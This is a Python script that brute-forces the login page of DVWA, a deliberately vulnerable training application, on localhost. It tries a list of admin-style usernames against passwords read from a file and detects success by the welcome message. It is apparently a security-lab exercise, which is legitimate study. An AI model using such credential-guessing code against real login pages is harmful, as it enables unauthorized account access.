import requests
from bs4 import BeautifulSoup

LOGINS = ['admin', 'admin123', 'admin1', 'administrator', 'superuser', 'user', 'username']


def brute(passwords: list) -> bool:
    cookies = {
        'security': 'low',
        'PHPSESSID': 'qu8blpbd8fso108tj24aactht9',
    }

    for login in LOGINS:
        for password in passwords:
            params = {
                "username": login,
                "password": password,
                "Login": "Login"
            }
            url = 'http://localhost/dvwa/vulnerabilities/brute/index.php'
            response = requests.get(url, cookies=cookies, params=params).text
            soup = BeautifulSoup(response, 'html.parser')
            correct_password = soup.find('p', string='Welcome to the password protected area admin')
            if correct_password:
                print(f"Успех!\n{login}:{password}")
                return True
    return False


if __name__ == '__main__':
    with open('passwords.txt', 'r', encoding='utf-8') as file:
        passwords = file.read().split('\n')
    if not brute(passwords):
        print("Неудача:(")
